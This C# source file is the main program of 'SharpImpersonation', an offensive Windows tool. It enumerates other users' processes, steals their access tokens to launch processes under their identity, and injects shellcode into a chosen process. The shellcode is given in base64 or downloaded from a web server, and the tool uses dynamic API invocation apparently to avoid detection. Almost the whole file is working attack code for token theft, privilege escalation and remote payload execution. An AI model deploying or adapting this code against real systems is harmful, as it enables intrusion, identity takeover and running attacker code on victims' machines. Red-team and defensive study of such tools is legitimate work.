using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.IO;
using System.Net;

namespace SharpImpersonation
{
    public class Program
    {


        public static void Main(string[] args)
        {
            //User Set
            string username = "";
            int procId = 0;

            // ImpersonateLoggedOnuser—  CreateProcessAsUserW— SetThreadToken—Assigns https://www.mcafee.com/enterprise/en-us/assets/reports/rp-access-token-theft-manipulation-attacks.pdf
            string technique = "CreateProcessAsUserW";

            string binary = "C:\\windows\\system32\\cmd.exe";
            string Args = "";
            string shellcode = "";

            bool onlyelevated = false;
            bool shellcodegiven = false;
            bool shellcodehttp = false;

            bool usernamegiven = false;

            bool listProcs = false;

            bool wmi = false;

            try
            {
                if (args.Length < 1)
                {
                    displayHelp();
                    return;
                }
                ArgumentParserResult arguments = ArgParse.Parse(args);

                if (arguments.ParsedOk == false)
                {
                    displayHelp();
                    return;
                }

                if (arguments.Arguments.ContainsKey("showhelp"))
                {
                    displayHelp();
                    return;
                }
                if (arguments.Arguments.ContainsKey("-h"))
                {
                    displayHelp();
                    return;
                }

                if (arguments.Arguments.ContainsKey("binary"))
                {
                    binary = arguments.Arguments["binary"];
                }

                if (arguments.Arguments.ContainsKey("shellcode"))
                {
                    shellcode = arguments.Arguments["shellcode"];
                    shellcodegiven = true;
                }


                if (arguments.Arguments.ContainsKey("list"))
                {
                    listProcs = true;
                }

                if (arguments.Arguments.ContainsKey("technique"))
                {
                    technique = arguments.Arguments["technique"];
                    Console.WriteLine("Using technique: " + technique);
                }

                if (arguments.Arguments.ContainsKey("elevated"))
                {
                    onlyelevated = true;
                }

                if (arguments.Arguments.ContainsKey("wmi"))
                {
                    wmi = true;
                }

                if (arguments.Arguments.ContainsKey("user"))
                {
                    username = arguments.Arguments["user"];
                    usernamegiven = true;
                }

                if (arguments.Arguments.ContainsKey("pid"))
                {
                    procId = Int32.Parse(arguments.Arguments["pid"]);
                }

                if (arguments.Arguments.ContainsKey("arguments"))
                {
                    Args = arguments.Arguments["arguments"];
                }


            }
            catch
            {
                displayHelp();
                return;
            }

            banner();
            if (listProcs)
            {
                if (wmi)
                {
                    ListUsersWMI();
                    return;
                }
                else if (onlyelevated)
                {
                    ListUsers(true);
                    return;
                }
                else
                {
                    ListUsers(false);
                    return;
                }
            }

            if (usernamegiven)
            {
                //CheckArgs();
                Console.WriteLine("\r\n[*] Username given, checking processes");
                Dictionary<String, UInt32> ProcByUser = new Dictionary<String, UInt32>();
                if (wmi)
                {
                    Console.WriteLine("\r\n[*] Using WMI to check processes");
                    ProcByUser = Enumeration.EnumerateTokensWMI();
                }
                else
                {
                    ProcByUser = Enumeration.EnumerateTokens(false);
                }
                bool userfound = false;
                foreach (String name in ProcByUser.Keys)
                {
                    if (name.ToUpper() == username.ToUpper())
                    {
                        userfound = true;
                        Console.WriteLine("\r\n[+] Found process for user " + username + " with PID: " + (int)ProcByUser[name] + "\r\n");
                        int ProcId = (int)ProcByUser[name];
                        if (shellcodegiven)
                        {
                            Console.WriteLine("[*] Injecting shellcode into ProcID: " + (int)ProcByUser[name] + " by username: " + username);
                            ExecShellcode(ProcId);
                        }
                        else
                        {
                            ImpersonateByTechnique(ProcId, binary, name, wmi);
                        }
                    }
                }
                if (!(userfound))
                {
                    Console.WriteLine("[-] Could not find process for user " + username + "!");
                    Console.WriteLine("[!] Run the command 'list' first and copy paste the exact match");
                    return;
                }
            }
            else
            {
                //CheckArgs();
                string uname = "";

                if (shellcodegiven)
                {
                    Console.WriteLine("\r\n[*] Injecting shellcode into ProcID: " + procId);
                    ExecShellcode(procId);
                }
                else
                {

                    Console.WriteLine("[*] ProcessID given, checking username\r\n");
                    Dictionary<String, UInt32> ProcByUser = new Dictionary<String, UInt32>();
                    try
                    {
                        ProcByUser = Enumeration.WMIEnumerateUserforProcID(procId);
                        foreach (String name in ProcByUser.Keys)
                        {
                            Console.WriteLine(name);
                            uname = name;
                        }
                        Console.WriteLine("\r\n[+] Username for ProcessID " + procId + " is found: " + uname + "\r\n");
                    }
                    catch
                    {
                        Console.WriteLine("[-] Process ID not found. Exiting.");
                        Environment.Exit(0);
                    }

                    ImpersonateByTechnique(procId, binary, uname, wmi);
                }
            }


            void ExecShellcode(int ID)
            {
                byte[] shellcodebytes;

                bool contains = shellcode.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0;

                if (contains)
                {
                    Console.WriteLine("\r\nLoading shellcode from webserver: " + shellcode + "\r\n");
                    shellcodehttp = true;
                }

                if (shellcodehttp)
                {
                    MemoryStream ms = new MemoryStream();
                    WebClient download = new WebClient();
                    ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;

                    ms = new MemoryStream(download.DownloadData(shellcode));
                    BinaryReader br = new BinaryReader(ms);
                    shellcodebytes = br.ReadBytes(Convert.ToInt32(ms.Length));
                }
                else
                {
                    shellcodebytes = Convert.FromBase64String(shellcode);
                }

                Shellcode.SyscallCreateRemoteThread(shellcodebytes, ID);
                return;
            }

            void ImpersonateByTechnique(int ProcessID, string bin, string uname, bool wmienum)
            {
                Tokens t = new Tokens();

                switch (technique)
                {
                    case "CreateProcessAsUserW":
                        //Change WINSTA/DESKTOP Permissions
                        Console.WriteLine("\r\n [*] Changing WINSTA/Desktop permissions for the target user: " + uname);
                        GrantAccessToWindowStationAndDesktop(uname);
                        t.StartProcessAsUser(ProcessID, binary);

                        break;
                    case "ImpersonateLoggedOnuser":
                        t.ImpersonateUser(ProcessID);
                        break;

                }
                return;
            }

        }



        static void ListUsers(bool elevatedonly)
        {
            Dictionary<String, UInt32> ProcByUser = new Dictionary<String, UInt32>();
            if (elevatedonly)
            {
                ProcByUser = Enumeration.EnumerateTokens(true);
            }
            else
            {
                ProcByUser = Enumeration.EnumerateTokens(false);
            }
            Console.WriteLine("{0,-30}{1,-30}", "UserName", "ProcessID");
            Console.WriteLine("{0,-30}{1,-30}", "--------", "---------");
            foreach (String name in ProcByUser.Keys)
            {
                Console.WriteLine("{0,-30}{1,-30}", name, ProcByUser[name]);
            }
        }

        static void ListUsersWMI()
        {
            Dictionary<String, UInt32> ProcByUser = new Dictionary<String, UInt32>();
            ProcByUser = Enumeration.EnumerateTokensWMI();

            Console.WriteLine("{0,-30}{1,-30}", "UserName", "ProcessID");
            Console.WriteLine("{0,-30}{1,-30}", "--------", "---------");
            foreach (String name in ProcByUser.Keys)
            {
                Console.WriteLine("{0,-30}{1,-30}", name, ProcByUser[name]);
            }
        }

        static void FindProcByUser(string userName)
        {
            Dictionary<UInt32, String> procs = new Dictionary<UInt32, String>();
            procs = Enumeration.EnumerateUserProcessesWMI(userName);

            Console.WriteLine("{0,-30}{1,-30}", "ProcessID", "ProcessName");
            Console.WriteLine("{0,-30}{1,-30}", "---------", "------------");
            foreach (uint ProcID in procs.Keys)
            {
                Console.WriteLine("{0,-30}{1,-30}", ProcID, procs[ProcID]);
            }
        }

        public static void banner()
        {
            Console.WriteLine(@" 
   _____ __                     ____                                                 __  _           
  / ___// /_  ____ __________  /  _/___ ___  ____  ___  ______________  ____  ____ _/ /_(_)___  ____ 
  \__ \/ __ \/ __ `/ ___/ __ \ / // __ `__ \/ __ \/ _ \/ ___/ ___/ __ \/ __ \/ __ `/ __/ / __ \/ __ \
 ___/ / / / / /_/ / /  / /_/ // // / / / / / /_/ /  __/ /  (__  ) /_/ / / / / /_/ / /_/ / /_/ / / / /
/____/_/ /_/\__,_/_/  / .___/___/_/ /_/ /_/ .___/\___/_/  /____/\____/_/ /_/\__,_/\__/_/\____/_/ /_/ 
                     /_/                 /_/                                                        
                                            By: S3cur3Th1sSh1t, @ShitSecure
             ");

        }

        public static void displayHelp()
        {
            banner();
            Console.WriteLine("\r\n===========================    List user processes    ===========================");
            Console.WriteLine("\r\nSharpImpersonation.exe list");
            Console.WriteLine("\r\n===========================    List user processes via wmi    ===========================");
            Console.WriteLine("\r\nSharpImpersonation.exe list wmi");
            Console.WriteLine("\r\n===========================    List only elevated processes    ===========================");
            Console.WriteLine("\r\nSharpImpersonation.exe list elevated");
            Console.WriteLine("\r\n\r\n===========================    Impersonate the first process of <user> to start a new <binary>    ===========================");
            Console.WriteLine("\r\nSharpImpersonation.exe user:<user> binary:<binary-Path>");
            Console.WriteLine("\r\n======================  Inject shellcode into the first process of <user>  ======================");
            Console.WriteLine("\r\nSharpImpersonation.exe user:<user> shellcode:<base64shellcode>");
            Console.WriteLine("\r\n======================  Impersonate process with the PID <ID> and start a <binary>  ======================");
            Console.WriteLine("\r\nSharpImpersonation.exe pid:<ID> binary:<binary-Path>");
            Console.WriteLine("\r\n======================  Impersonate user <user> to use this token for the current process (NtSetInformationThread)  ======================");
            Console.WriteLine("\r\nSharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser");
            return;
        }

        // Stolen from https://stackoverflow.com/questions/677874/starting-a-process-with-credentials-from-a-windows-service
        public static void GrantAccessToWindowStationAndDesktop(string username)
        {
            Console.WriteLine(" [*] Setting Permission for : " + username + "\r\n");
            IntPtr handle;
            //username = "everyone";
            const int WindowStationAllAccess = 0x000f037f;
            /* P/Invoke
            handle = GetProcessWindowStation();
            GrantAccess(username, handle, WindowStationAllAccess);
            const int DesktopRightsAllAccess = 0x000f01ff;
            handle = GetThreadDesktop(GetCurrentThreadId());
            GrantAccess(username, handle, DesktopRightsAllAccess);
            */
            // D/Invoke
            object[] GetProcessWindowStationArgs = { };
            handle = (IntPtr)InvokeItDynamically.DynGen.DynamicAPIInvoke("user32.dll", "GetProcessWindowStation", typeof(GetProcessWindowStation), ref GetProcessWindowStationArgs, true, true);
            GrantAccess(username, handle, WindowStationAllAccess);
            const int DesktopRightsAllAccess = 0x000f01ff;
            object[] GetCurrentThreadIdArgs = { };
            int ThreadID = (int)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "GetCurrentThreadId", typeof(GetCurrentThreadId), ref GetCurrentThreadIdArgs, true, true);
            object[] GetThreadDesktopArgs = { ThreadID };
            handle = (IntPtr)InvokeItDynamically.DynGen.DynamicAPIInvoke("user32.dll", "GetThreadDesktop", typeof(GetThreadDesktop), ref GetThreadDesktopArgs, true, true);
            GrantAccess(username, handle, DesktopRightsAllAccess);

        }

        private static void GrantAccess(string username, IntPtr handle, int accessMask)
        {
            SafeHandle safeHandle = new NoopSafeHandle(handle);
            GenericSecurity security =
                new GenericSecurity(
                    false, ResourceType.WindowObject, safeHandle, AccessControlSections.Access);

            security.AddAccessRule(
                new GenericAccessRule(
                    new NTAccount(username), accessMask, AccessControlType.Allow));
            security.Persist(safeHandle, AccessControlSections.Access);
        }

        // All the code to manipulate a security object is available in .NET framework,
        // but its API tries to be type-safe and handle-safe, enforcing a special implementation
        // (to an otherwise generic WinAPI) for each handle type. This is to make sure
        // only a correct set of permissions can be set for corresponding object types and
        // mainly that handles do not leak.
        // Hence the AccessRule and the NativeObjectSecurity classes are abstract.
        // This is the simplest possible implementation that yet allows us to make use
        // of the existing .NET implementation, sparing necessity to
        // P/Invoke the underlying WinAPI.

        private class GenericAccessRule : AccessRule
        {
            public GenericAccessRule(
                IdentityReference identity, int accessMask, AccessControlType type) :
                base(identity, accessMask, false, InheritanceFlags.None,
                     PropagationFlags.None, type)
            {
            }
        }

        private class GenericSecurity : NativeObjectSecurity
        {
            public GenericSecurity(
                bool isContainer, ResourceType resType, SafeHandle objectHandle,
                AccessControlSections sectionsRequested)
                : base(isContainer, resType, objectHandle, sectionsRequested)
            {
            }

            new public void Persist(SafeHandle handle, AccessControlSections includeSections)
            {
                base.Persist(handle, includeSections);
            }

            new public void AddAccessRule(AccessRule rule)
            {
                base.AddAccessRule(rule);
            }

            #region NativeObjectSecurity Abstract Method Overrides

            public override Type AccessRightType
            {
                get { throw new NotImplementedException(); }
            }

            public override AccessRule AccessRuleFactory(
                System.Security.Principal.IdentityReference identityReference,
                int accessMask, bool isInherited, InheritanceFlags inheritanceFlags,
                PropagationFlags propagationFlags, AccessControlType type)
            {
                throw new NotImplementedException();
            }

            public override Type AccessRuleType
            {
                get { return typeof(AccessRule); }
            }

            public override AuditRule AuditRuleFactory(
                System.Security.Principal.IdentityReference identityReference, int accessMask,
                bool isInherited, InheritanceFlags inheritanceFlags,
                PropagationFlags propagationFlags, AuditFlags flags)
            {
                throw new NotImplementedException();
            }

            public override Type AuditRuleType
            {
                get { return typeof(AuditRule); }
            }

            #endregion
        }

        // Handles returned by GetProcessWindowStation and GetThreadDesktop should not be closed
        private class NoopSafeHandle : SafeHandle
        {
            public NoopSafeHandle(IntPtr handle) :
                base(handle, false)
            {
            }

            public override bool IsInvalid
            {
                get { return false; }
            }

            protected override bool ReleaseHandle()
            {
                return true;
            }
        }

        // end of stolen from

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr GetProcessWindowStation();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr GetThreadDesktop(int dwThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int GetCurrentThreadId();

    }

}
